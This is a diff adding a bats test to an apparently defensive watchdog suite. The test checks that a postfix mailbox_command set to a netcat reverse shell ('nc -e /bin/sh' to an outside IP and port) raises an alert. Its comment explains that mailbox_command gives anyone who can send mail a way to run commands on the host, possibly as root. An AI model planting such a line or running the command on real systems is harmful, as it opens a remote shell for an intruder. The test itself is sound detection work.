@@ -268,3 +268,19 @@ seed_benign() {
     run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (nc reverse-shell variant in mailbox_command: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
+    # Sister to the brain-wide nc reverse-shell variant INVARIANT
+    # family already locked. postfix mailbox_command runs AS THE
+    # RECIPIENT USER (or root for system mailboxes) on every
+    # delivered message — a remotely-triggerable exec surface
+    # (anyone who can send mail to root@host triggers root exec
+    # via mailbox_command). Closes the nc reverse-shell sister axis
+    # on the mail-triggered exec surface.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf 'mailbox_command = nc -e /bin/sh 1.1.1.1 4444\n' > "${MAIN}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
